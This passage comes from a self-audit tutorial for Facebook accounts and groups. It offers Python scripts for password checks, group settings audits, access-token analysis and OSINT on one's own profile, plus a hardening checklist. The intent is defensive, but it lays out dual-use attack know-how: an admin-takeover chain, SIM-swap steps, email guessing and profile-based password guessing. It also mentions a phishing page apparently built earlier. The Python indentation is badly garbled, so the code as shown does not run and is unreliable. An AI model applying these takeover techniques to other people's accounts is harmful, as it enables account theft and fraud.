																														# Check for name/personal info (simplified)
																														if len(password) < 8:
																															weak_patterns.append("Too short (minimum 12 recommended)")
																															
																															if password.lower() in ['password', '123456', 'facebook', 'admin']:
																																weak_patterns.append("Common password - in every hacker's wordlist!")
																																
																																if password.isdigit():
																																	weak_patterns.append("All numbers - much weaker")
																																	
																																	if password.isalpha():
																																		weak_patterns.append("All letters - missing numbers/special chars")
																																		
																																		# Check for sequential patterns
																																		for i in range(len(password) - 2):
																																			if (ord(password[i]) + 1 == ord(password[i+1]) and 
																																				ord(password[i+1]) + 1 == ord(password[i+2])):
																																				weak_patterns.append("Contains sequential characters (abc, 123)")
																																				break
																																				
																																				if weak_patterns:
																																					print("\n[!] Weak patterns found:")
																																					for p in weak_patterns:
																																						print(f"    ❌ {p}")
																																						else:
																																							print("[+] No obvious weak patterns found")
																																							
																																							# Suggestions
																																							print(f"\n{'='*60}")
																																							print("HOW TO MAKE A STRONGER PASSWORD:")
																																							print(f"{'='*60}")
																																							print("""
																																							Method 1: Passphrase (easy to remember, hard to crack)
																																							correct-horse-battery-staple-2024!
																																							(4 random words + number + special = very strong)
																																							
																																							Method 2: Random string (use password manager)
																																							K9#mP2$nQ7@xR4!
																																							(impossible to remember, but password manager does it)
																																							
																																							Rules:
																																							✓ Minimum 16 characters (20+ is better)
																																							✓ Mix of uppercase, lowercase, numbers, symbols
																																							✓ Never use: name, birthday, city, pet name
																																							✓ Unique for every site (never reuse!)
																																							✓ Use KeePass or Bitwarden to manage passwords
																																							""")
																																							
																																							return entropy
																																							
																																							# ================================================
																																							# HOW TO USE:
																																							# Replace MY_PASSWORD with your actual Facebook password
																																							# The script shows how easy/hard it would be to crack
																																							# ================================================
																																							
																																							MY_FACEBOOK_PASSWORD = "YourPasswordHere"
																																							
																																							entropy = analyze_password_strength(MY_FACEBOOK_PASSWORD)
																																							```
																																							
																																							```bash
																																							python3 password_test.py
																																							```
																																							
																																							---
																																							
																																							## 7. Facebook Group Attack Simulation
																																							
																																							### Test Your Group's Security
																																							
																																							```bash
																																							cd ~/facebook_research
																																							nano group_security_test.py
																																							```
																																							
																																							```python
																																							# group_security_test.py
																																							# WHAT IT DOES: Tests your Facebook group's security settings
																																							# and simulates what an attacker would try
																																							# WHERE TO RUN: Parrot OS terminal  
																																							# HOW TO RUN: python3 group_security_test.py
																																							# ALSO DO: Manual tests in Facebook on your phone (instructions inside)
																																							
																																							import webbrowser
																																							import time
																																							
																																							def run_group_security_audit():
																																							"""
																																							Complete security audit of your Facebook group.
																																							Some tests are automated, most require manual checking in Facebook.
																																							"""
																																							
																																							print("\n" + "="*60)
																																							print("FACEBOOK GROUP SECURITY AUDIT")
																																							print("="*60)
																																							
																																							results = {
																																								'passed': [],
																																								'failed': [],
																																								'check_manually': []
																																							}
																																							
																																							print("""
																																							We will test your group against real attack scenarios:
																																							
																																							TEST 1: Admin Account Security
																																							TEST 2: Group Privacy Settings  
																																							TEST 3: Member Management Security
																																							TEST 4: Post/Content Security
																																							TEST 5: Social Engineering Resistance
																																							TEST 6: Recovery and Backup
																																							""")
																																							
																																							# ========================================
																																							# TEST 1: Admin Account Security
																																							# ========================================
																																							print("\n" + "-"*50)
																																							print("TEST 1: Admin Account Security")
																																							print("-"*50)
																																							print("""
																																							ACTION: Check your Facebook admin account settings
																																							
																																							Open on your phone or laptop:
																																							facebook.com → Menu → Settings & Privacy → Settings
																																							→ Security and Login
																																							
																																							CHECK THESE:
																																							""")
																																							
																																							checks = [
																																								("Two-Factor Authentication enabled?",
																																								 "Settings → Security → Two-Factor Authentication",
										 "If NO: An attacker only needs your password to take your account!"),

("Using Authenticator App (NOT SMS)?",
 "Settings → Security → Two-Factor Authentication → Authentication App",
 "If SMS only: SIM swap attack can bypass your 2FA!"),

("Login alerts enabled?",
 "Settings → Security → Get alerts about unrecognized logins",
 "If NO: You won't know if someone accesses your account!"),

("Check active sessions?",
 "Settings → Security → Where You're Logged In",
 "Remove any sessions you don't recognize!"),
																																							]
																																							
																																							for i, (check, location, risk) in enumerate(checks, 1):
																																								print(f"  {i}. {check}")
																																								print(f"     📍 Location: {location}")
																																								print(f"     ⚠️  Risk if NO: {risk}")
																																								print()
																																								results['check_manually'].append(check)
																																								
																																								# ========================================
																																								# TEST 2: Group Privacy Settings
																																								# ========================================
																																								print("\n" + "-"*50)
																																								print("TEST 2: Group Privacy Settings")
																																								print("-"*50)
																																								print("""
																																								ACTION: Check your group settings
																																								
																																								Open your Facebook group → Admin tools → Group settings
																																								
																																								CHECK THESE:
																																								""")
																																								
																																								group_checks = [
																																									("Group privacy setting?",
																																									 "Group Settings → Privacy",
										  "Public = anyone can see all posts and members\n"
										  "     Private = only members see posts (recommended!)"),
										  
										  ("Who can approve member requests?",
										   "Group Settings → Membership",
			 "If 'Anyone': Members can add anyone without admin approval!"),

("Who can post?",
 "Group Settings → Posts",
 "If 'Anyone': Attackers who join can immediately post phishing links!"),

("Post approval required?",
 "Group Settings → Posts → Post Approval",
 "Without approval: Spam/phishing posts visible immediately to all members"),
																																								]
																																								
																																								for i, (check, location, risk) in enumerate(group_checks, 1):
																																									print(f"  {i}. {check}")
																																									print(f"     📍 Location: {location}")
																																									print(f"     ⚠️  Risk: {risk}")
																																									print()
																																									
																																									# ========================================
																																									# TEST 3: Social Engineering Simulation
																																									# ========================================
																																									print("\n" + "-"*50)
																																									print("TEST 3: Social Engineering Resistance Test")
																																									print("-"*50)
																																									
																																									social_eng_scenarios = [
																																										{
																																											'attack': 'Fake Facebook Support Message',
																																											'simulation': '''
																																											SIMULATE THIS (send yourself this message from another account):
																																											---
																																											From: "Facebook Support Team"
																																											Message: "Your group [YOUR GROUP NAME] has violated our Community 
																																											Standards. To avoid removal, verify your admin account within 24 hours:
																																											[link]"
																																											---
																																											QUESTION: Would you click that link?
																																											ANSWER: NO! Facebook never contacts admins via Messenger about policy issues.
																																											''',
																																											'defense': 'Go directly to facebook.com/help for any real issues'
																																										},
{
	'attack': 'Fake Admin Account Request',
	'simulation': '''
	SIMULATE THIS:
	A new member (or someone you barely know) sends you a DM:
	"Hey, I'm having issues with my main account. Can you add this account
	as admin temporarily until it's fixed?"
	---
	QUESTION: Would you add them as admin?
	ANSWER: NO! Only add admins you've verified via video call or phone.
	''',
	'defense': 'Verify admin identity via video call before giving access'
},
{
	'attack': 'Compromised Member Account',
	'simulation': '''
	SIMULATE THIS:
	A trusted long-time group member sends a post:
	"Check out this amazing investment opportunity! I made $5000 in one week!
	[link to suspicious site]"
	---
	QUESTION: Would you trust this post?
	ANSWER: NO! The member's account may be compromised.
	Real people don't suddenly post investment spam.
	''',
	'defense': 'Enable post approval, ban phishing keywords automatically'
}
																																									]
																																									
																																									for i, scenario in enumerate(social_eng_scenarios, 1):
																																										print(f"\n  Scenario {i}: {scenario['attack']}")
																																										print(f"  {scenario['simulation']}")
																																										print(f"  🛡️ Defense: {scenario['defense']}")
																																										
																																										# ========================================
																																										# TEST 4: What Attacker Sees From Your Group
																																										# ========================================
																																										print("\n" + "-"*50)
																																										print("TEST 4: Attacker's View of Your Group")
																																										print("-"*50)
																																										print("""
																																										DO THIS RIGHT NOW:
																																										
																																										1. Open a private/incognito browser window
																																										2. Go to your group's URL WITHOUT logging in
																																										3. Answer these questions:
																																										
																																										Can a stranger see:
																																										□ Group name and description?
																																										□ Member count?
																																										□ List of members and admins? ← Attacker uses this to target admins!
																																										□ Recent posts?
																																										□ Photos and media?
																																										□ Admin names and profiles?
																																										
																																										If you answered YES to "Admin names visible":
																																										→ Attacker can research each admin
																																										→ Find weakest admin (no 2FA, public profile, etc.)
																																										→ Target that admin with phishing
																																										→ Take over their account
																																										→ Take over your group!
																																										
																																										ALSO CHECK:
																																										Go to: facebook.com/[your-group-url]/members/admins/
																																										(while logged out)
																																										Can you see admin names? That's what attackers see!
																																										""")
																																										
																																										# ========================================
																																										# TEST 5: Admin Takeover Simulation
																																										# ========================================
																																										print("\n" + "-"*50)
																																										print("TEST 5: Admin Takeover Attack Chain (Read-Through)")
																																										print("-"*50)
																																										print("""
																																										This is the complete attack chain an attacker uses.
																																										Understanding it helps you defend against it.
																																										
																																										STEP 1: Reconnaissance (5 minutes)
																																										Attacker visits your group
																																										Notes: admin names, profile pictures
																																										Researches admins on Facebook
																																										Finds: birthday, hometown, workplace (often public!)
																																										
																																										STEP 2: Choose Target Admin
																																										Picks admin who seems least security-aware:
																																										- Posts personal info publicly
																																										- Public profile with lots of info
																																										- Account has no visible security indicators
																																										
																																										STEP 3: Phishing Attack
																																										Creates fake Facebook email:
																																										From: security@facebook-notify.com (not real!)
																																										"Admin access for [Your Group] requires verification"
																																										Link → phishing page (like what we built!)
																																										
																																										STEP 4: Credential Capture
																																										Admin clicks link (thinks it's real)
																																										Enters password on fake page
																																										Attacker gets credentials instantly
																																										
																																										STEP 5: Account Takeover
																																										Attacker logs in with captured credentials
																																										(If no 2FA → immediate access!)
																																										(If SMS 2FA → attempts SIM swap or waits for victim to enter code on phishing page)
																																										
																																										STEP 6: Group Takeover
																																										From compromised admin account:
																																										→ Adds attacker's accounts as admins
																																										→ Removes real admins
																																										→ Changes group name/description
																																										→ Posts spam to all members
																																										→ Sells access to group (10,000 member groups sold for $100-500!)
																																										
																																										DEFENSE AT EACH STEP:
																																										Step 1: Make admin profiles private
																																										Step 2: All admins use 2FA
																																										Step 3: Never click email links - go directly to facebook.com
																																										Step 4: Use hardware security key (phishing impossible!)
																																										Step 5: Enable login alerts, check sessions
																																										Step 6: Multiple trusted admins, review admin list regularly
																																										""")
																																										
																																										# Final recommendations
																																										print("\n" + "="*60)
																																										print("YOUR GROUP SECURITY SCORE")
																																										print("="*60)
																																										
																																										print("""
																																										Rate yourself honestly (1 point each):
																																										
																																										[ ] All admins have 2FA enabled
																																										[ ] Using authenticator app (not SMS) for 2FA
																																										[ ] Admin profiles are set to Friends-only privacy
																																										[ ] Group requires admin approval for new members
																																										[ ] New member posts require approval
																																										[ ] Group has multiple trusted admins (backup)
																																										[ ] You've educated admins about phishing
																																										[ ] You regularly review admin list
																																										[ ] Group has keyword filters for spam/phishing words
																																										[ ] You know how to report group takeover to Facebook
																																										
																																										SCORE:
																																										0-3: 🔴 HIGH RISK - Group is vulnerable
																																										4-6: 🟡 MODERATE - Some protections needed
																																										7-9: 🟢 GOOD - Well protected
																																										10:  ✅ EXCELLENT - Maximum security
																																										""")
																																										
																																										run_group_security_audit()
																																										```
																																										
																																										```bash
																																										python3 group_security_test.py
																																										```
																																										
																																										---
																																										
																																										## 8. API Token Testing
																																										
																																										### Get and Test Your Own Access Token
																																										
																																										```bash
																																										cd ~/facebook_research/api_tests
																																										nano api_test.py
																																										```
																																										
																																										```python
																																										# api_test.py
																																										# WHAT IT DOES: Tests what your Facebook access token can access
																																										# Shows what third-party apps can do with your data
																																										# WHERE TO RUN: Parrot OS terminal
																																										# HOW TO RUN: 
																																										#   1. Get your token from developers.facebook.com/tools/explorer
																																										#   2. Paste it below
																																										#   3. python3 api_test.py
																																										
																																										import requests
																																										import json
																																										
																																										def test_access_token(access_token):
																																										"""
																																										Tests what an access token can do.
																																										Shows exactly what apps see when you log in with Facebook.
																																										"""
																																										
																																										BASE = "https://graph.facebook.com/v18.0"
																																										headers = {'Authorization': f'Bearer {access_token}'}
																																										
																																										print("\n" + "="*60)
																																										print("FACEBOOK ACCESS TOKEN ANALYSIS")
																																										print("="*60)
																																										
																																										# First: Debug the token itself
																																										print("\n[*] Step 1: Analyzing the token...")
																																										debug_url = f"{BASE}/debug_token"
																																										params = {
																																											'input_token': access_token,
																																											'access_token': access_token
																																										}
																																										
																																										r = requests.get(debug_url, params=params)
																																										if r.status_code == 200:
																																											data = r.json().get('data', {})
																																											print(f"\n  Token valid: {data.get('is_valid')}")
																																											print(f"  App ID:     {data.get('app_id', 'N/A')}")
																																											print(f"  User ID:    {data.get('user_id', 'N/A')}")
																																											
																																											expires = data.get('expires_at', 0)
																																											if expires == 0:
																																												print(f"  Expires:    Never (long-lived token!)")
																																												else:
																																													import datetime
																																													exp_date = datetime.datetime.fromtimestamp(expires)
																																													print(f"  Expires:    {exp_date}")
																																													
																																													scopes = data.get('scopes', [])
																																													print(f"\n  Permissions granted ({len(scopes)} total):")
																																													for scope in scopes:
																																														print(f"    ✓ {scope}")
																																														
																																														# Test 2: What can we read?
																																														print("\n[*] Step 2: Testing data access...")
																																														
																																														endpoints = [
																																															('me', 'Basic profile info'),
																																															('me?fields=id,name,email,birthday,location,hometown', 'Extended profile'),
																																															('me/friends', 'Friends list'),
																																															('me/posts', 'Your posts'),
																																															('me/groups', 'Groups you\'re in'),
																																															('me/photos', 'Your photos'),
																																															('me/messages', 'Messages (requires special permission)'),
																																														]
																																														
																																														accessible = []
																																														blocked = []
																																														
																																														for endpoint, description in endpoints:
																																															r = requests.get(f"{BASE}/{endpoint}", headers=headers, timeout=10)
																																															
																																															if r.status_code == 200:
																																																data = r.json()
																																																
																																																# Show what we can see
																																																if endpoint == 'me':
																																																	print(f"\n  [+] {description}:")
																																																	print(f"      Name: {data.get('name', 'N/A')}")
																																																	print(f"      ID:   {data.get('id', 'N/A')}")
																																																	
																																																	elif endpoint.startswith('me?fields'):
																																																	print(f"\n  [+] {description}:")
																																																	for field in ['email', 'birthday', 'location', 'hometown']:
																																																		if field in data:
																																																			print(f"      {field}: {data[field]}")
																																																			
																																																			elif 'me/friends' in endpoint:
																																																			total = data.get('summary', {}).get('total_count', 0)
																																																			print(f"\n  [+] {description}: Can see {total} friends")
																																																			
																																																			elif 'me/groups' in endpoint:
																																																			groups = data.get('data', [])
																																																			print(f"\n  [+] {description}: Member of {len(groups)} groups")
																																																			for g in groups[:3]:
																																																				print(f"      - {g.get('name')} ({g.get('privacy')})")
																																																				
																																																				else:
																																																					items = data.get('data', [])
																																																					print(f"\n  [+] {description}: {len(items)} items accessible")
																																																					
																																																					accessible.append(description)
																																																					
																																																					elif r.status_code == 403:
																																																					blocked.append(description)
																																																					print(f"\n  [-] {description}: BLOCKED (need more permissions)")
																																																					else:
																																																						print(f"\n  [?] {description}: Status {r.status_code}")
																																																						
																																																						# Summary
																																																						print(f"\n{'='*60}")
																																																						print("WHAT THIS MEANS FOR SECURITY")
																																																						print(f"{'='*60}")
																																																						print(f"""
																																																						Accessible with this token:
																																																						{chr(10).join('  ✓ ' + a for a in accessible)}
																																																						
																																																						This token was obtained from: developers.facebook.com/tools/explorer
																																																						
																																																						A REAL ATTACK SCENARIO:
																																																						1. Malicious website says "Login with Facebook"
																																																						2. You click and approve permissions
																																																						3. They get an access token like this
																																																						4. They can read all accessible data above
																																																						5. They don't need your password
																																																						6. They can do this indefinitely (or until you revoke)
																																																						
																																																						REVIEW YOUR CONNECTED APPS:
																																																						facebook.com → Settings → Apps and Websites
																																																						
																																																						Look for apps you don't recognize or don't use anymore
																																																						These all have access tokens to your data!
																																																						Remove any you don't need.
																																																						
																																																						PERMISSIONS TO WATCH OUT FOR:
																																																						email       = They have your email address
																																																						user_posts  = They can read all your posts
																																																						groups      = They know all your groups
																																																						friends     = They can see your friends
																																																						publish_to_groups = They can POST to your groups!
																																																						""")
																																																						
																																																						# ================================================
																																																						# HOW TO GET YOUR ACCESS TOKEN:
																																																						#
																																																						# 1. Go to: developers.facebook.com/tools/explorer
																																																						# 2. Login with your Facebook account
																																																						# 3. Click "Generate Access Token" button
																																																						# 4. Check some permissions like: email, user_posts, groups
																																																						# 5. Click "Generate Access Token" again
																																																						# 6. Copy the token that appears
																																																						# 7. Paste it below
																																																						# ================================================
																																																						
																																																						# PASTE YOUR TOKEN HERE:
																																																						MY_ACCESS_TOKEN = "EAAxxxxxxxxxxxxxxxx"  # Replace with your real token
																																																						
																																																						if MY_ACCESS_TOKEN == "EAAxxxxxxxxxxxxxxxx":
																																																							print("\n[!] PLEASE SET YOUR ACCESS TOKEN FIRST!")
																																																							print("[*] Instructions:")
																																																							print("    1. Go to: developers.facebook.com/tools/explorer")
																																																							print("    2. Generate a token")
																																																							print("    3. Paste it in the MY_ACCESS_TOKEN variable above")
																																																							else:
																																																								test_access_token(MY_ACCESS_TOKEN)
																																																								```
																																																								
																																																								```bash
																																																								python3 api_test.py
																																																								```
																																																								
																																																								---
																																																								
																																																								## 9. OSINT on Your Own Profile
																																																								
																																																								### Complete OSINT Scan
																																																								
																																																								```bash
																																																								cd ~/facebook_research/osint
																																																								nano full_osint.py
																																																								```
																																																								
																																																								```python
																																																								# full_osint.py
																																																								# WHAT IT DOES: Complete OSINT scan of your own Facebook presence
																																																								# Shows exactly what information about you is publicly available
																																																								# WHERE TO RUN: Parrot OS terminal
																																																								# HOW TO RUN: python3 full_osint.py
																																																								# ALSO: Follow the manual steps it suggests
																																																								
																																																								def run_complete_osint(your_facebook_username, your_name, your_email):
																																																								"""
																																																								Complete OSINT report - shows everything an attacker would research
																																																								before attacking your account.
																																																								"""
																																																								
																																																								print("\n" + "="*60)
																																																								print("COMPLETE OSINT REPORT")
																																																								print(f"Target: facebook.com/{your_facebook_username}")
																																																								print("="*60)
																																																								
																																																								print(f"""
																																																								PART 1: PUBLIC FACEBOOK PRESENCE
																																																								==================================
																																																								
																																																								1. Direct Profile URL:
																																																								https://www.facebook.com/{your_facebook_username}
																																																								
																																																								→ Open this in INCOGNITO window while logged out
																																																								→ Note everything visible to strangers
																																																								
																																																								2. Facebook Search:
																																																								Search on Google: site:facebook.com "{your_name}"
																																																								What appears? Photos? Bio? Posts?
																																																								
																																																								3. Facebook Graph Search (old but still works for some):
																																																								https://www.facebook.com/search/top?q={your_name.replace(' ', '%20')}
																																																								
																																																								PART 2: OTHER PLATFORM PRESENCE
																																																								==================================
																																																								
																																																								Check if same username exists on:
																																																								https://www.instagram.com/{your_facebook_username}/
																																																								https://twitter.com/{your_facebook_username}
																																																								https://www.tiktok.com/@{your_facebook_username}
																																																								https://www.reddit.com/user/{your_facebook_username}
																																																								https://github.com/{your_facebook_username}
																																																								https://www.linkedin.com/in/{your_facebook_username}
																																																								
																																																								Cross-platform presence reveals:
																																																								- Real name (if using pseudonym on one)
																																																								- Personal website
																																																								- Work history
																																																								- Hobbies
																																																								- Additional contact info
																																																								
																																																								PART 3: IMAGE ANALYSIS
																																																								==================================
																																																								
																																																								Your profile picture reverse search:
																																																								1. Save your profile picture
																																																								2. Go to: images.google.com
																																																								3. Click camera icon → upload image
																																																								
																																																								OR use: www.tineye.com
																																																								
																																																								This shows:
																																																								- Other websites using your photo
																																																								- Other accounts with same photo
																																																								- Old versions of your photo
																																																								- Your real name if photo is elsewhere
																																																								
																																																								PART 4: EMAIL INVESTIGATION
																																																								==================================
																																																								""")
																																																								
																																																								# Email OSINT
																																																								print(f"Checking your email: {your_email}")
																																																								
																																																								# Generate likely alternate emails
																																																								name_parts = your_name.lower().split()
																																																								if len(name_parts) >= 2:
																																																									first = name_parts[0]
																																																									last = name_parts[-1]
																																																									
																																																									likely_emails = [
																																																										f"{first}.{last}@gmail.com",
f"{first}{last}@gmail.com",
f"{first}_{last}@gmail.com",
f"{first}@gmail.com",
f"{your_facebook_username}@gmail.com",
f"{first}.{last}@yahoo.com",
f"{first}.{last}@hotmail.com",
																																																									]
																																																									
																																																									print("\nEmail addresses an attacker would try:")
																																																									for email in likely_emails:
																																																										marker = "← Your actual email" if email == your_email else ""
																																																										print(f"   {email} {marker}")
																																																										
																																																										print(f"""
																																																										Email investigation tools:
																																																										hunter.io          - Find emails associated with domains
																																																										haveibeenpwned.com - Check if email in breaches
																																																										gmail.com/accounts/lookup - Check if Gmail exists
																																																										
																																																										PART 5: PASSWORD HINTS FROM YOUR PROFILE
																																																										==================================
																																																										
																																																										Information visible on your Facebook that hackers
																																																										use to guess your password:
																																																										
																																																										CHECK YOUR OWN PROFILE FOR:
																																																										□ Birthday:           → Used in passwords: Name1990, Name15031990
																																																										□ Hometown:          → Used in passwords: ChittagongBoy, BD_1990
																																																										□ Sports team:       → Used in passwords: Barca2024, ManUnited!
																																																										□ Pet name:          → Used in passwords: Bruno123, PuppyBruno!
																																																										□ Partner's name:    → Used in passwords: iloveSara, Sara+You
																																																										□ School/University: → Used in passwords: CUET2020, Engineering!
																																																										□ Favorite quotes:   → "I am the best" → passwords based on this
																																																										
																																																										HOW TO TEST: Generate a wordlist from YOUR profile info
																																																										(see the wordlist_from_profile.py script)
																																																										
																																																										PART 6: WHAT AN ATTACKER WOULD DO WITH THIS INFO
																																																										==================================
																																																										
																																																										With your full profile researched:
																																																										
																																																										1. Try credential stuffing:
																																																										Your email + common passwords → try on Facebook
																																																										
																																																										2. Try account recovery:
																																																										Submit recovery request using your email
																																																										Answer security questions with your public info
																																																										
																																																										3. Targeted phishing:
																																																										Create email: "Hey [Your Name], check this photo..."
																																																										Much more convincing when they know your name!
																																																										
																																																										4. SIM swap (if phone visible):
																																																										Call your carrier pretending to be you
																																																										Use your public info to verify identity
																																																										Get your phone number transferred to their SIM
																																																										Now they get your SMS 2FA codes!
																																																										
																																																										5. Social engineering:
																																																										Message you pretending to be a friend
																																																										Ask you to click a link ("Hey! You're in this video!")
																																																										Link = phishing or malware
																																																										
																																																										PART 7: YOUR RECOMMENDATIONS
																																																										==================================
																																																										""")
																																																										
																																																										recommendations = [
																																																											"Set profile to Friends-only (not public)",
																																																											"Hide birthday from public",
"Hide hometown or make Friends-only", 
"Hide family relationships",
"Remove phone number from profile",
"Remove email from profile",
"Make friends list private",
"Make groups list private",
"Enable 2FA with authenticator app",
"Use hardware security key for maximum protection",
"Set unique strong password not related to personal info",
"Remove old/unused connected apps",
"Set up login alerts",
"Regularly review active sessions",
																																																										]
																																																										
																																																										for i, rec in enumerate(recommendations, 1):
																																																											print(f"  {i:2}. {rec}")
																																																											
																																																											print("\n[*] Fix all of these and your attack surface shrinks dramatically!")
																																																											
																																																											# ================================================
																																																											# HOW TO USE:
																																																											# Replace with YOUR information
																																																											# ================================================
																																																											
																																																											MY_FACEBOOK_USERNAME = "your.username"     # Part after facebook.com/
																																																											MY_FULL_NAME = "Your Full Name"            # Your real name on Facebook
																																																											MY_EMAIL = "your@email.com"                # Email linked to Facebook
																																																											
																																																											run_complete_osint(MY_FACEBOOK_USERNAME, MY_FULL_NAME, MY_EMAIL)
																																																											```
																																																											
																																																											```bash
																																																											python3 full_osint.py
																																																											```
																																																											
																																																											---
																																																											
																																																											## 10. Defense — Harden Everything
																																																											
																																																											### Run This Checklist Right Now
																																																											
																																																											```bash
																																																											nano security_checklist.py
																																																											```
																																																											
																																																											```python
																																																											# security_checklist.py
																																																											# WHAT IT DOES: Interactive security checklist
																																																											# Walk through each security measure for your account AND group
																																																											# WHERE TO RUN: Parrot OS terminal
																																																											# HOW TO RUN: python3 security_checklist.py
																																																											
																																																											def run_security_checklist():
																																																											"""Interactive security hardening checklist"""
																																																											
																																																											print("\n" + "="*60)
																																																											print("FACEBOOK SECURITY HARDENING CHECKLIST")
																																																											print("Complete this for your account AND your group")
																																																											print("="*60)
																																																											
																																																											categories = {
																																																												
																																																												"ACCOUNT SECURITY (Do these first!)": [
																																																													{
																																																														"check": "Enable 2-Factor Authentication",
																																																														"how": "Facebook → Settings → Security and Login → Two-Factor Authentication → Enable",
																																																														"choose": "Use 'Authentication App' (Google Authenticator or Authy) NOT SMS!",
																																																														"why": "Without this, phishing attack = account taken over. With this, attacker also needs your phone.",
																																																														"priority": "🔴 CRITICAL"
																																																													},
																																																													{
																																																														"check": "Set strong unique password",
																																																														"how": "Settings → Security and Login → Change Password",
																																																														"choose": "20+ chars, random, not personal info. Use KeePass to generate/store.",
																																																														"why": "Weak password = brute force or credential stuffing works",
																																																														"priority": "🔴 CRITICAL"
																																																													},
																																																													{
																																																														"check": "Enable login alerts",
																																																														"how": "Settings → Security and Login → Get alerts about unrecognized logins → Enable both Email and Messenger",
																																																														"choose": "Turn on BOTH email and Messenger notifications",
																																																														"why": "If attacker logs in, you'll know immediately and can kick them out",
																																																														"priority": "🟠 HIGH"
																																																													},
																																																													{
																																																														"check": "Check active sessions",
																																																														"how": "Settings → Security and Login → Where You're Logged In",
																																																														"choose": "Click 'Not You?' or 'Log Out' for any session you don't recognize",
																																																														"why": "If you already have an intruder, this kicks them out",
																																																														"priority": "🟠 HIGH"
																																																													},
																																																													{
																																																														"check": "Review connected apps",
																																																														"how": "Settings → Apps and Websites",
																																																														"choose": "Remove any apps you don't recognize or don't use anymore",
																																																														"why": "Old apps have access to your data. Some may be malicious.",
																																																														"priority": "🟡 MEDIUM"
																																																													},
																																																													{
																																																														"check": "Set up trusted contacts",
																																																														"how": "Settings → Security and Login → Choose 3-5 friends",
																																																														"choose": "Only add people you can call and verify by voice/video",
																																																														"why": "If locked out, these people can help recover. Choose carefully!",
																																																														"priority": "🟡 MEDIUM"
																																																													},
																																																												],
																																																												
																																																												"PRIVACY SETTINGS": [
																																																													{
																																																														"check": "Set profile to Friends-only",
																																																														"how": "Settings → Privacy → Who can see your future posts? → Friends",
																																																														"choose": "Also click 'Limit Past Posts' to restrict old public posts",
																																																														"why": "Public profile = attackers can research you for social engineering",
																																																														"priority": "🟠 HIGH"
																																																													},
																																																													{
																																																														"check": "Hide personal information",
																																																														"how": "Your Profile → Edit → Contact and Basic Info",
																																																														"choose": "Remove or h
